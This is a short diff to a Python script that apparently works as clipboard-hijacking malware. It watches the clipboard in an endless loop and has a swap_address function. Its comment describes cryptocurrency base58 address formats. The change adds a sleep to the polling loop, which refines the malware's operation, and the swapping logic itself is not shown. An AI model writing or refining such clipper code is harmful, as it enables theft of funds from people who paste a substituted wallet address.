@@ -6,6 +6,7 @@
 # the do not contain uppercase 'O', number '0', lowercase 'l' and uppercase 'I'
 
 import clipboard
+import time
 
 def get_clipboard():
     # store clipboard value
@@ -28,4 +29,4 @@ def swap_address(data):
 
 while True:
     get_clipboard()
-    
+    time.sleep(2)
